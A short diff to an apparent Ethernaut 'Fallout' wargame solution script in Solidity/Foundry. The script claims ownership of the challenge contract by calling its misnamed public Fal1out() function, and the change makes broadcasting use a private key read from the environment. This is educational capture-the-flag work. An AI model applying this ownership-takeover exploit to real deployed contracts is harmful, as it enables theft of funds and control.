@@ -11,7 +11,7 @@ contract ExploitLevel2 is Script {
     Fallout instance = Fallout(0x8216C602F2A89ec5C915C21C82Cb8E2359fBF033);
 
     function run() external {
-        vm.broadcast();
+        vm.broadcast(vm.envUint("PRIVATE_KEY"));
         instance.Fal1out();
 
         console.log("Instance owner", instance.owner());
